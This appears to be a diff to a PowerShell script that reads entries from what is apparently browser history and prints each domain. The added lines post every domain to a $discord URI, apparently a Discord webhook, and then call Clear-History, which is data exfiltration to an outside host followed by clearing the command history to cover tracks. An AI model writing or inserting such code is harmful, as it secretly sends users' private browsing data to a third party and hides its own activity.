@@ -7,5 +7,9 @@ Foreach ($entry in $history){
 		$url = $entry
 		$domain = $url -replace 'http:\/\/','' -replace 'https:\/\/','' -replace '\/.*',''
 		Write-Host "Entry: " $domain
+		Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($domain | ConvertTo-Json)
 	}
 }
+
+
+Clear-History
